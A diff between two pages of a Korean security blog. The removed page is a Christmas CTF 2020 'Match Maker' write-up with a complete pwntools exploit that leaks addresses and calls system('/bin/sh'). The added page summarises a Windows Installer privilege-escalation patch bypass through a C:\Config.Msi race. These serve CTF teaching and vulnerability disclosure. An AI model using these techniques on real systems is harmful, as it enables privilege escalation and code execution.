@@ -19,14 +19,14 @@
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
-  <meta property="og:title" content="[Write-Up] Christmas CTF 2020 - Match Maker - hackyboiz">
+  <meta property="og:title" content="[하루한줄] Windows Installer EoP 6th patch bypass - hackyboiz">
   <meta property="og:description" content="hack &amp; life">
   <meta property="og:image" content="/img/favicon.ico">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
-  <link rel="canonical" href="https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/">
+  <link rel="canonical" href="https://hackyboiz.github.io/2020/12/30/fabu1ous/2020-12-30/">
 
-  <title>[Write-Up] Christmas CTF 2020 - Match Maker - hackyboiz</title>
+  <title>[하루한줄] Windows Installer EoP 6th patch bypass - hackyboiz</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
@@ -178,8 +178,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-12-29 21:00" pubdate>
-      2020년 12월 29일 오후
+    <time datetime="2020-12-30 18:00" pubdate>
+      2020년 12월 30일 오후
     </time>
   </div>
 
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      544 자
+      192 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      3
        분
     </span>
   
@@ -231,112 +231,15 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">[Write-Up] Christmas CTF 2020 - Match Maker</h1>
+            <h1 style="display: none">[하루한줄] Windows Installer EoP 6th patch bypass</h1>
             
             <div class="markdown-body" id="post-body">
-              <h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/match-maker/1.png" srcset="/img/loading.gif"></p>
-<ol>
-<li><p>프로필을 만듭니다.</p>
-<ul>
-<li>이름, 나이, 성별, 취미를 입력</li>
-<li>나이 정보에 따라 파트너 매칭 함수가 달라짐</li>
-</ul>
-</li>
-<li><p>만든 프로필을 저장합니다.</p>
-<ul>
-<li>만들어진 프로필을 힙에 저장</li>
-<li>성별을 구분하여 전역 배열에 힙 주소 저장.</li>
-</ul>
-</li>
-<li><p>파트너 매칭을 합니다.</p>
-</li>
-<li><p>매칭 된 파트너의 정보를 출력합니다.</p>
-</li>
-<li><p>유저 리스트를 출력합니다.</p>
-<ul>
-<li>현재 프로필이 남자면 여자 리스트를 출력</li>
-<li>현재 프로필이 여자면 남자 리스트를 출력</li>
-</ul>
-</li>
-</ol>
-<h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p>find match 기능에서 사용할 알고리즘을 정하는 로직이 존재합니다. pref_min_age != pref_max_age이면서 pref_min_age ^ 2 == pref_max_age ^ 2 일 때 초기화되지 않은 스택의 쓰레기 값으로 rip를 조작할 수 있습니다. int-overflow를 활용하면 됩니다.</p>
-<p>show user list 기능에서 user list를 참조할 때 sex ^1을 index로 사용합니다. 프로필 작성 시 성별 입력값에 제한이 없기 때문에 이를 이용해 바이너리 base주소와 libc base 주소를 얻을 수 있습니다.</p>
-<h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul>
-<li>int overflow → uninitialized stack</li>
-</ul>
-<p><img src="/2020/12/29/fabu1ous/match-maker/2.png" srcset="/img/loading.gif"></p>
-<p>프로필 생성 메뉴에서 입력받은 나이 정보를 토대로 파트너 매칭 루틴을 정하는 코드입니다. if…else가 아닌 if…if 이므로 integer overflow를 발생시켜 <code>(void*)func()</code>의 값을 스택에 있던 쓰레기 값으로 설정할 수 있습니다.</p>
-<p><img src="/2020/12/29/fabu1ous/match-maker/3.png" srcset="/img/loading.gif"></p>
-<p>연상 혹은 연하 중 선호하는 쪽을 계산하는 루틴에서 절댓값을 사용합니다. 입력할 수 있는 나이에 최댓값 제한이 없기 때문에 int overflow를 발생시켜 스택 변수 <code>(void*)func()를</code> 초기화하는 작업을 건너뛸 수 있습니다.</p>
-<p><img src="/2020/12/29/fabu1ous/match-maker/4.png" srcset="/img/loading.gif"></p>
-<p><code>(void*)func()</code>값에 영향을 미치는 쓰레기 값은 name을 입력받을 때 사용하던 버퍼입니다.</p>
-<p><img src="/2020/12/29/fabu1ous/match-maker/5.png" srcset="/img/loading.gif"></p>
-<p>메인 메뉴에서 find match를 선택하면 rip가 잡히는 것을 확인할 수 있습니다.</p>
-<ul>
-<li>out of bound read</li>
-</ul>
-<p><img src="/2020/12/29/fabu1ous/match-maker/6.png" srcset="/img/loading.gif"></p>
-<p>성별은 int로 입력받습니다.</p>
-<p>0 : 남자</p>
-<p>1 : 여자</p>
-<p><img src="/2020/12/29/fabu1ous/match-maker/7.png" srcset="/img/loading.gif"></p>
-<p>현재 프로필이 남자면 여자 유저 리스트를, 여자면 남자 리스트를 출력해주는 함수입니다. 0도 1도 아닌 다른 값을 성별로 입력하면 oob-read가 가능합니다. binary의 base주소, libc의 base주소를 leak 할 수 있습니다.</p>
-<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
-
-p = process(<span class="hljs-string">&#x27;./match&#x27;</span>)
-
-<span class="hljs-comment">#gdb.attach(p)</span>
-<span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span>
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make</span>(<span class="hljs-params">age, name, Pmin, Pmax, sex</span>):</span>
-	p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)
-	p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>, age)
-	p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>, name)
-	p.sendlineafter(<span class="hljs-string">&#x27;min age limit for you: &#x27;</span>, Pmin)
-	p.sendlineafter(<span class="hljs-string">&#x27;max age limit for you: &#x27;</span>, Pmax)
-	p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, sex)
-	p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 1 : &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
-	p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 2 : &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)
-	p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 3 : &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)
-	
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save</span>():</span>
-	p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
-	
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span>():</span>
-	p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)
-	
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showL</span>():</span>
-	p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)
-
-<span class="hljs-comment"># leak bin base</span>
-make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;-2&#x27;</span>)
-showL()
-p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)
-leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)
-bin_base = leak - <span class="hljs-number">0x5008</span>
-log.info(hex(bin_base))
-
-<span class="hljs-comment"># leak read@libc</span>
-make(<span class="hljs-string">&#x27;65536&#x27;</span>, p64(bin_base+<span class="hljs-number">0x4fa0</span>)+<span class="hljs-string">b&#x27;BBBBBBBBCCCCCCCC&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)
-save()
-showL()
-p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)
-leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)
-system = leak - <span class="hljs-number">0xbbd20</span>
-log.info(hex(system))
-
-make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh;&#x27;</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span>+p64(system), <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)
-find()
-
-p.interactive()</code></pre>
-
-<pre><code class="hljs plain">[+] Opening connection to localhost on port 1234: Done
-[*] 0x55ad3a345000
-[*] 0x7f414a9ec410
-[*] Switching to interactive mode
-$ cat flag
-XMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>
-
+              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://halove23.blogspot.com/2020/12/oh-so-you-have-antivirus-nameevery-bug.html">Disclosing about 8 0-day vulnerability</a></p>
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows installer</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://hackyboiz.github.io/2020/10/21/fabu1ous/2020-10-21/">CVE-2020-16902</a>에 대한 패치 우회가 공개되었습니다. CVE-2019-1415로 처음 제보된 Windows Installer EoP 취약점의 6번째 패치 우회입니다. </p>
+<p>CVE-2020-16902의 내용은 다음과 같습니다. Windows Installer는 설치 작업 실패를 대비해 설치 작업 중 삭제되는 파일과 롤백 스크립트를<code> C:\Config.Msi</code> 디렉터리에 백업합니다. 백업 전에 <code>C:\Config.Msi</code> 디렉터리를 삭제하고 재생성하는 로직이 있는데 <code>Setsecurity()</code>의 race condition 취약점 패턴이 남아있어 악용이 가능합니다.</p>
+<p>따라서 <code>C:\Config.Msi</code>를 삭제하고 <code>C:\Config.Msi</code>이 여전히 존재한다면(race-con 트리거 조건) <code>C:\Config.Msi</code> 대신 <code>C:\windows\install\config.msi</code>에 롤백 파일을 백업하도록 패치되었습니다. </p>
+<p>하지만 다음과 같은 이유로 우회가 가능합니다. 만약 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> 레지스트리 키가 존재하면 그대로 <code>C:\Config.Msi</code>를 백업에 사용합니다.  <code>C:\Config.Msi</code>를 삭제한 후 <code>C:\Config.Msi</code>의 삭제 여부를 한번 더 체크한 다음 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> 레지스트리 키를 삭제합니다.  <code>C:\Config.Msi</code>가 삭제된 직후 <code>C:\Config.Msi</code>를 생성하면 레지스트리 키가 삭제되지 않습니다. Windows Installer는 <code>C:\Config.Msi</code>를 백업에 사용하게 되고 이전 취약점들을 그대로 악용할 수 있습니다.</p>
 
             </div>
             <hr>
@@ -346,7 +249,7 @@ XMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>
                 <div class="post-meta mr-3">
                   <i class="iconfont icon-category"></i>
                   
-                  <a class="hover-with-bg" href="/categories/Write-Up/">Write-Up</a>
+                  <a class="hover-with-bg" href="/categories/1day1line/">1day1line</a>
                   
                 </div>
                 
@@ -356,13 +259,13 @@ XMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>
                   
                   <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
                   
-                  <a class="hover-with-bg" href="/tags/pwnable/">pwnable</a>
+                  <a class="hover-with-bg" href="/tags/eop/">eop</a>
                   
-                  <a class="hover-with-bg" href="/tags/oob/">oob</a>
+                  <a class="hover-with-bg" href="/tags/windows/">windows</a>
                   
-                  <a class="hover-with-bg" href="/tags/uninitialized-stack/">uninitialized stack</a>
+                  <a class="hover-with-bg" href="/tags/race-condition/">race condition</a>
                   
-                  <a class="hover-with-bg" href="/tags/integer-overflow/">integer overflow</a>
+                  <a class="hover-with-bg" href="/tags/toctou/">toctou</a>
                   
                 </div>
                 
@@ -401,18 +304,12 @@ XMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>
                 <article class="post-prev col-6">
                   
                   
-                  <a href="/2020/12/30/fabu1ous/2020-12-30/">
-                    <i class="iconfont icon-arrowleft"></i>
-                    <span class="hidden-mobile">[하루한줄] Windows Installer EoP 6th patch bypass</span>
-                    <span class="visible-mobile">Previous</span>
-                  </a>
-                  
                 </article>
                 <article class="post-next col-6">
                   
                   
-                  <a href="/2020/12/29/fabu1ous/no-g/">
-                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - No g</span>
+                  <a href="/2020/12/29/fabu1ous/match-maker/">
+                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - Match Maker</span>
                     <span class="visible-mobile">Next</span>
                     <i class="iconfont icon-arrowright"></i>
                   </a>
@@ -431,8 +328,8 @@ XMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>
     <div id="disqus_thread"></div>
     <script type="text/javascript">
       var disqus_config = function () {
-        this.page.url = 'https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/';
-        this.page.identifier = '/2020/12/29/fabu1ous/match-maker/';
+        this.page.url = 'https://hackyboiz.github.io/2020/12/30/fabu1ous/2020-12-30/';
+        this.page.identifier = '/2020/12/30/fabu1ous/2020-12-30/';
       };
       function loadDisqus() {
         (function () {
@@ -578,7 +475,7 @@ XMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "[Write-Up] Christmas CTF 2020 - Match Maker&nbsp;",
+        "[하루한줄] Windows Installer EoP 6th patch bypass&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
